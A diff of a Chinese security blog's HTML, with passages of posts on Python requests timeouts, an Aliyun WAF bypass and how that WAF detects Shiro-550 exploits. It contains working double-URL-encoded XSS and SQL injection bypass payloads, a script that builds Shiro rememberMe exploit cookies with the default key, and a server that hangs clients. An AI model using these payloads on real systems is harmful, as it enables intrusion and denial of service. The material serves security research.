poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
-
-<p>流程如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
-
-<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
-</li>
-<li><p>什么是read超时?</p>
-<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
-<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
-<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
-<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
-<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
-<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
-<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
-<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
-<ul>
-<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
-</li>
-<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
-<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
-<ul>
-<li>dns解析阶段 不受timeout参数控制</li>
-<li>connect阶段 受timeout参数控制</li>
-<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
-</ul>
-<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
-<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1297,7 +1297,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1310,7 +1310,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
+          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1334,58 +1334,45 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
-<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
-<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
-<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
-<p>我研究了下面的问题：</p>
-<ul>
-<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
-<li>哪些waf存在这种绕过风险？</li>
-<li>怎么利用？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么验证？</p>
-<p>构造满足下面条件的数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
-
-<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
-<p>比如，如果有一个waf面对如下的测试payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
-<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
-<p>就可以构造出下面的”最终payload”：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
-
-<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
+<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
+<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
+<ol>
+<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
+<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
+</ol>
+<p>第二个方法存在两个问题：</p>
+<ol>
+<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
 </li>
-<li><p>验证阿里云waf</p>
-<p>以下是阿里云waf实际拦截结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
+<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
+<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
 </li>
-<li><p>验证长亭waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
+</ol>
+<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
 
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
-
-<p>所以，长亭waf不存在此风险</p>
+<ol>
+<li><p>测试攻击请求</p>
+<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
+<p> 发送请求后，阿里云waf拦截</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>怎么利用？</p>
-<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
-<p>构造payload的过程如同上面”怎么验证”的过程。</p>
-<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
-
+<li><p>测试正常请求</p>
+<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
+<p> 结论：正常请求阿里云waf未拦截</p>
 </li>
-</ul>
-<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
-<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
-<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
+</ol>
+<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
+<ol>
+<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
+<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
+</ol>
+<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
 
       
     </div>
